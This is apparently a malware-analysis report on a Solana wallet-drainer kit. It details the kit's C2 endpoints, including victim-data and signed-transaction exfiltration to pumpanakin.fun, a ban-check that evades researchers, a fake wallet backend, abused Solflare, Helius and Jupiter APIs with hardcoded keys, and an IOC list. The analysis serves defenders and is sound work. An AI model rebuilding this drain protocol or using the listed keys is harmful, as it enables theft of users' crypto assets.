# Backend Protocol — C2 Endpoints Deep Dive

Full specification of every server-side endpoint the kit communicates with,
reconstructed from static analysis of the deobfuscated bundle.

---

## Base URL Construction

All requests use:
```
https://pumpanakin.fun/<C2_PATH_PREFIX>/<endpoint>
```
Where `C2_PATH_PREFIX = "ab060a03-7874-4647-84d1-da019e4b51ea"`.

This UUID path segment is the **only thing separating the C2 endpoints from public access**.
Without it, the endpoints are unreachable. It acts as a shared secret embedded in the bundle.

Standard request headers on all C2 calls (via `c2Fetch` / `锏`):
```
User-Agent:    <victimWalletAddress>    ← base58 Solana public key
Authorization: Bearer <randomToken>     ← UUID-ish, regenerated per request
Referrer-Policy: no-referrer            ← hides referrer from server logs
```

---

## Endpoint 1 — Page Visit Registration

```
POST /ab060a03-7874-4647-84d1-da019e4b51ea/api/visit
```

**When:** Immediately on page load, before any wallet interaction.

**Purpose:** Log the victim's visit to the operator dashboard. Gives operators real-time traffic stats.

**Request body (inferred from code):**
```json
{
  "ts":   1731234567890,
  "ref":  "https://t.me/...",
  "ua":   "Mozilla/5.0 (iPhone...)",
  "lang": "en-US",
  "tz":   "America/New_York"
}
```

**Response:** Ignored by client.

---

## Endpoint 2 — Ban Check

```
GET /ab060a03-7874-4647-84d1-da019e4b51ea/is-banned
User-Agent: <walletAddress>
```

**When:** After wallet connects, before asset enumeration.

**Purpose:** Operator can manually ban specific wallet addresses (researchers, honeypots, their own test wallets). Returns `"1"` to silently stop the drain for that address.

**Response:**
```
"1"   → wallet is banned; kit does nothing
"0"   → proceed
""    → proceed
```

**Mechanism:** Server maintains a blocklist. When a known researcher's wallet connects, the kit gets a `"1"` and exits cleanly — no suspicious behavior, no errors.

This is why standard honeypot wallets are ineffective against this kit once discovered.

---

## Endpoint 3 — Wallet Connect Notification

```
POST /ab060a03-7874-4647-84d1-da019e4b51ea/c/i
Content-Type: application/json
User-Agent: <walletAddress>
Authorization: Bearer <token>
```

**When:** Immediately after successful wallet connection and asset enumeration.

**Purpose:** Notify the operator (via Telegram) that a wallet connected, with its asset values.

**Request body:**
```json
{
  "Description: ": "/c/c/",
  "‌/c/f/:": "✅ text/plain\n✅ https://wallet-api.solflare.com/\n🚫 v2/swap/capped-tokens?currency=USD\n📥 /c/i:\n+ 2.3 SOL (~ $450)\n+ 1000 USDC (~ $1000)"
}
```

The zero-width characters in the JSON keys (`​` = U+200B, `‌` = U+200C) are intentional — they create invisible formatting when rendered in Telegram.

**What the operator's Telegram sees:**
```
📥 /c/i:
+ 2.300 SOL (~ $450.00)
+ 1000.00 USDC (~ $1000.00)

Description:    /c/c/
/c/f/:          ✅ text/plain
                ✅ https://wallet-api.solflare.com/
                🚫 v2/swap/capped-tokens?currency=USD
```

**Response:** Ignored.

---

## Endpoint 4 — Transfer Start Notification

```
POST /ab060a03-7874-4647-84d1-da019e4b51ea/c/c/
Content-Type: application/json
User-Agent: <walletAddress>
Authorization: Bearer <token>
```

**When:** Immediately before broadcasting signed transactions to the backend.

**Purpose:** Notify operator that the victim signed the transactions and drain is in progress.

**Request body:**
```json
{
  "​Description: ": "/c/c/",
  "‌/c/f/:": "✅ text/plain\n✅ https://wallet-api.solflare.com/\n🚫 v2/swap/capped-tokens?currency=USD"
}
```

(Same format as `/c/i` but with slightly different field values based on `connectionState`.)

---

## Endpoint 5 — Transfer Complete Notification

```
POST /ab060a03-7874-4647-84d1-da019e4b51ea/c/f/
Content-Type: application/json
User-Agent: <walletAddress>
Authorization: Bearer <token>
```

**When:** After signed transactions are submitted to `/process`.

**Purpose:** Notify operator the drain is complete; includes the hexfomo.fun vendor watermark for DaaS revenue tracking.

**Request body:**
```json
{
  "Message": "<walletAddress> <endpoint>.\nComputeBudget111111111111111111111111111111\n<walletAddress>\niAAD6AMAAMb6evO+2606PWXzaqvJdDGxu+TC0vbg5Hym...\naGV4Zm9tby5mdW4EVVNEQwAA\nIssued At: Tue Nov 10 2026 14:23:11 GMT+0000\nRequest ID: <random>"
}
```

#### hexfomo.fun Watermark Decoded

The base64 `aGV4Zm9tby5mdW4EVVNEQwAA` in the notification:
```
hex: 68 65 78 66 6f 6d 6f 2e 66 75 6e  04 55 53 44 43  00 00
     h  e  x  f  o  m  o  .  f  u  n   ↑  U  S  D  C   null-pad
                                     length prefix (4)
```
Decoded: `"hexfomo.fun"` + length-prefixed `"USDC"` + null padding.

This is a Solana **Memo program instruction payload** — it gets included in the actual on-chain transaction as a memo, permanently recording the kit vendor's brand on every drain transaction in the blockchain.

The full base64 blob prepended before this in the notification:
```
iAAD6AMAAMb6evO+2606PWXzaqvJdDGxu+TC0vbg5HymAgNFL11hYGUBswLhgBiS+
AopefWF+IVdDyA0eQokVfdE+sUD17UnZJe6C7hlkXK3Lt2MZuGPVhdk2chqYQo6fg
95wLr52wZAf0AAAAAAAD/wAAAAAAAABQAAAAUAAAAAAAAAAAEAAAAAAAALaGV4Zm9t
by5mdW4EVVNEQwAA
```

This is a **pre-serialized partial instruction** baked into the bundle source — the ComputeBudget preamble + memo instruction bytes, hardcoded at build time by hexfomo.fun when they compiled this operator's kit. This is how they track which of their kit deployments generated which transactions.

---

## Endpoint 6 — Transaction Broadcast

```
POST /ab060a03-7874-4647-84d1-da019e4b51ea/process
Content-Type: application/json
User-Agent: <walletAddress>
Authorization: Bearer <token>
```

**When:** After victim signs all transactions.

**Purpose:** Forward signed transaction bytes to the backend, which broadcasts them via Helius.

**Request body:**
```json
{
  "transactions": [
    "base64EncodedSignedTx1",
    "base64EncodedSignedTx2",
    "..."
  ],
  "wallet": "<victimWalletAddress>"
}
```

**Why not broadcast from browser:**
- Some wallets (Phantom) show a second confirmation dialog on `sendTransaction`
- Backend can retry with higher priority fees if transactions fail
- Backend can implement its own ordering (highest value first)
- Keeps network traffic off the victim's browser for forensic purposes

**Backend behavior (inferred):**
1. Deserializes each transaction
2. Calls Helius `sendTransaction` with `{skipPreflight: true, maxRetries: 5}`
3. Monitors confirmation via `getSignatureStatus`
4. On failure: re-submits with bumped priority fee (up to `亊` = 3 retries)

**Response:** Ignored by client (fire and forget).

---

## Endpoint 7 — Error Handler

```
POST /ab060a03-7874-4647-84d1-da019e4b51ea/api/handler
Content-Type: application/json
User-Agent: <walletAddress>
Authorization: Bearer <token>
```

**When:** On any unhandled error during the drain flow.

**Purpose:** Log errors to the operator panel for debugging. DaaS vendors use this to improve their kit.

**Request body (inferred):**
```json
{
  "error": "Error message string",
  "wallet": "<victimWalletAddress>",
  "state": <connectionState>,
  "ts": <unix_ms>
}
```

---

## Endpoint 8 — Configuration Fetch

```
GET /ab060a03-7874-4647-84d1-da019e4b51ea/config
User-Agent: <walletAddress>
Authorization: Bearer <token>
```

**When:** On error dialog display (when the kit wants to show a custom error message).

**Purpose:** Fetch operator-configured error dialog content.

**Response (inferred):**
```json
{
  "title": "Transaction Failed",
  "message": "Transaction was reverted, funds will be refunded soon.",
  "button": "Try Again"
}
```

---

## Fake Wallet Backend — `reactwalletback.com`

Separate backend for the fake wallet app channel. Not the same server as pumpanakin.fun.

Base URL: `https://reactwalletback.com/`

Authentication is different — uses hardcoded API keys embedded in the `听` class:

### Endpoint A — App Link (fake wallet install redirect)
```
GET https://reactwalletback.com/app-link/<walletAddress>
```
Opens the fake wallet app with victim's address. If the app is installed, it harvests credentials. If not, the HTTP request fails silently (`.catch()` swallows error).

### Endpoint B — Localization (via `fwcInstance.bn`)
```
GET https://reactwalletback.com/<apiKey1>/<languageCode>
Authorization: Bearer <apiKey2>
```
Returns localized strings to replace `NOTIFY_STRINGS`. Allows operator to serve notifications in victim's language.

### Endpoint C — Ban Check (fake wallet variant)
```
GET https://reactwalletback.com/<apiKey3>
```
Returns `"1"` if banned.

API keys:
```
apiKey1 = "9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS"
apiKey2 = "2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc"  
apiKey3 = "5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3"
```

---

## Solflare API Abuse

The kit uses the Solflare wallet's backend APIs **without authentication** to enumerate victim assets.
These are designed for Solflare's own mobile wallet — not rate-limited for external use.

```
GET https://wallet-api.solflare.com/v3/portfolio/tokens/<address>
    ?enablePartialErrors=true
```
Returns full token portfolio with USD values. No API key required.

```
GET https://wallet-api.solflare.com/v2/swap/capped-tokens?currency=USD
```
Returns list of tokens with sufficient liquidity for Jupiter swaps. No API key required.

This is **API abuse** — the kit is scraping Solflare's internal wallet backend.

---

## Helius RPC Abuse

Four Helius API keys are hardcoded for the Solana RPC:
```
0b9f580f-8102-4b89-928b-8770a62771f0
2dfa2086-c6cd-4cb4-8a13-08ecdee36a0f
3a1ca16d-e181-4755-9fe7-eac27579b48c
777d85c0-fefd-42a0-b290-8b1b3704fe90
```

These keys are likely stolen or purchased. They give the kit:
- Reliable Solana RPC access (no rate limits)
- `getBalance`, `getMultipleAccounts`, `getProgramAccounts`
- `sendTransaction` on the backend for broadcasting

The kit fails over across all four keys + 4 public endpoints on error.

---

## Jupiter API Abuse

Five Jupiter API keys are hardcoded in the `汦` / SolflareClient class:
```
cc0769f7-ceba-4abf-83d8-e7c083921665
5f1f45eb-a550-4e95-ad0e-b26e6ec0702d
a4ed32be-dcdf-4702-aba0-aee15c512427
f707107a-6d56-4626-a937-ef3c7eef51d8
ab060a03-7874-4647-84d1-da019e4b51ea   ← same UUID as C2 path prefix
```

Used for:
- Quote API: `GET https://quote-api.jup.ag/v6/quote`
- Swap API: `POST https://api.jup.ag/`

---

## DaaS Revenue Model — hexfomo.fun

```
Kit vendor (hexfomo.fun)
    ↓  sells access to operators for flat fee or revenue share
Operator (pumpanakin.fun)
    ↓  deploys kit, drives traffic via social media / fake apps
Victim connects wallet
    ↓  drain transactions broadcast
On-chain: each drain tx has Memo instruction with "hexfomo.fun" + "USDC"
    ↓  hexfomo.fun indexes blockchain memos to count transactions per operator
    ↓  charges operator based on transaction count / volume
Operator receives assets to their addresses:
    6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj  (main receiver)
    4QFiKg8ejx5LfqqLNbnKsiCnbEgRtgakBF6abMrkquKW  (secondary)
    + 11 other attacker-controlled addresses
```

The watermark is immutable on-chain evidence linking every drain transaction to the hexfomo.fun kit.
Searching Solana explorers for the memo `aGV4Zm9tby5mdW4=` (base64 of "hexfomo.fun") would reveal the full history of this kit's victims.

---

## Full IOC Reference

### Domains
| Domain | Role |
|--------|------|
| `pumpanakin.fun` | Main lure / C2 |
| `hexfomo.fun` | Kit vendor (DaaS) |
| `reactwalletback.com` | Fake wallet backend |
| `nulltrace.app` | Traffic Direction System |
| `72.chat` | WeChat bot sink |
| `cloudflare.aipages.dev` | CN redirect target |
| `global.aipages.dev` | Mobile redirect target |
| `api.jup.ag` | Jupiter (legitimate, abused) |
| `wallet-api.solflare.com` | Solflare (legitimate, abused) |
| `mainnet.helius-rpc.com` | Helius (legitimate, abused) |

### Solana Addresses — Attacker-Controlled
```
6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj  (primary receiver)
4QFiKg8ejx5LfqqLNbnKsiCnbEgRtgakBF6abMrkquKW  (secondary receiver)
DvTqmF7uMbLaW56QsMvcgv8KSkydFEikuk5gUcjACPV
4cfdFcVuJf8PPXpMWPMCDehSE4gV4C8oYwpZnLra7rtW
TwrGADB9QPrLfTKpWuyq9tjgRaGsuzgRUMFTz51uhsa
syspv6Qe5BbK8GPEjLbMnmF9hZy7juAuePbuspciCFP
A5chdzL3UMQZBqBRdXFFCT9HTK7JZs6h4TEYVCQLQydo
```

### Solana Addresses — Operator-Targeted
```
6ugBBLhRJqsuB1H4G6rGBMCyMWjdFpvpEUKnp6XCB1t7
9piPeQWJ7wxGmsWieeJhQKJ13DjJLga9j8CE5ydLTHC6
6ARSYR2B1aPWSjK11ZXDPmApgLgar3bCrm2BTYGS2jBK
4qti6FcMybVSLL2k4rqRQ3Ph1a2jGrzPmBN8Wmt4A5wr
HsVYhMDQRf6CkjtdUzqNDNRfDwsgw9nAX8feLVC3TAGp
4moJ9mfFDqFgGMp5UJUgcVhAaFtBxiapt9DVJE3LcVao
```

### API Keys
| Key | Service |
|----|---------|
| `0b9f580f-8102-4b89-928b-8770a62771f0` | Helius RPC |
| `2dfa2086-c6cd-4cb4-8a13-08ecdee36a0f` | Helius RPC |
| `3a1ca16d-e181-4755-9fe7-eac27579b48c` | Helius RPC |
| `777d85c0-fefd-42a0-b290-8b1b3704fe90` | Helius RPC |
| `cc0769f7-ceba-4abf-83d8-e7c083921665` | Jupiter |
| `5f1f45eb-a550-4e95-ad0e-b26e6ec0702d` | Jupiter |
| `a4ed32be-dcdf-4702-aba0-aee15c512427` | Jupiter |
| `f707107a-6d56-4626-a937-ef3c7eef51d8` | Jupiter |
| `9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS` | reactwalletback.com |
| `2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc` | reactwalletback.com |
| `5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3` | reactwalletback.com |

### Fake Mobile Apps
| App | App Store ID | Publisher |
|----|------------|---------|
| Volsungar | `id6757104054` | Asgarbyte |
| SOC Wallet | — | SOC JOINT STOCK |
| Hero Wallet | — | PAYEXCHANGE |

### On-Chain Fingerprint
Memo payload: `aGV4Zm9tby5mdW4EVVNEQwAA`
Searching Solana block explorers for transactions containing this memo string reveals all drain transactions by this kit family.
